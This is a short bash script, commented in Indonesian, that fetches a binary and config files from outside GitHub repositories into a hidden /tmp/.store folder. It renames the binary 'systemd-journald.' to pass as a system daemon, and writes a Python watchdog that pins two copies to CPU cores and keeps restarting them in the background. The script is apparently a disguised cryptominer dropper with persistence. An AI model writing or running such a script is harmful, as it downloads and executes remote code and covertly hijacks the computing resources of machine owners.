#!/bin/bash

# Warna buat gaya manja
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Setup environment...${NC}"

# Buat folder
mkdir -p /tmp/.store/1 /tmp/.store/2

# Download config 1
cd /tmp/.store/1
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini

# Download config 2
cd /tmp/.store/2
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini

# Balik ke .store
cd /tmp/.store

# Download dan extract file utama
wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald.

# Copy ke folder 1 dan 2
cp systemd-journald. /tmp/.store/1/
cp systemd-journald. /tmp/.store/2/
chmod +x /tmp/.store/1/systemd-journald.
chmod +x /tmp/.store/2/systemd-journald.

# Bersih-bersih
rm -f systemd-journald.

# Bikin skrip python penjaga setia
cat > /tmp/.store/guardian.py << 'EOF'
import os
import subprocess
import time

def is_process_running(path):
    try:
        output = subprocess.check_output(['pgrep', '-f', path])
        return bool(output.strip())
    except subprocess.CalledProcessError:
        return False

def start_process(folder, cpu_core):
    print(f"[*] Menjalankan proses dari {folder} di CPU core {cpu_core}...")
    os.chdir(folder)
    subprocess.Popen(["taskset", "-c", str(cpu_core), "./systemd-journald."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    while True:
        if not is_process_running("/tmp/.store/1/systemd-journald."):
            start_process("/tmp/.store/1", 0)
        if not is_process_running("/tmp/.store/2/systemd-journald."):
            start_process("/tmp/.store/2", 1)
        time.sleep(30)

if __name__ == "__main__":
    main()
EOF

chmod +x /tmp/.store/guardian.py

echo -e "${GREEN}[*] Starting guardian...${NC}"

# Start guardian python
cd /tmp/.store
nohup python3 guardian.py > /dev/null 2>&1 &

echo -e "${GREEN}[✓] Setup selesai, proses jalan di background.${NC}"

# Cek yang jalan
ps aux | grep systemd-journald. | grep -v grep
